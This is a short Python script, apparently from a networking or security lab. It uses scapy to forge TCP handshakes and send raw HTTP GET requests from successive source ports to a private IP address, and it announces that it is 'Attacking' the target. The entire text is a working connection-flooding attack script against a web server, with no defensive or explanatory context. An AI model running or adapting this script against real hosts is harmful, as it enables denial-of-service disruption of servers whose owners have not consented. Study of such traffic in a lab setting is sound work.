from scapy.all import *
from scapy.layers.inet import IP, TCP

target = '192.168.1.103'
sp = 80
numgets = 10

print("Attacking ", target, " with ", numgets, " GETs")

i = IP()
i.dst = target
print("IP layer prepared: ", i.summary())
ans = None

for s in range(sp, sp+numgets-1):
    t = TCP()
    t.dport = 80
    t.sport = s
    t.flags = "S"
    ans = sr1(i/t, verbose=0)
    t.seq = ans.ack
    t.ack = ans.seq + 1
    t.flags = "A"
    get = "GET / HTTP/1.1\r\nHost: " + target
    ans = sr1(i/t/get, verbose=0)
    print("Attacking from port ", s)
print("Done!")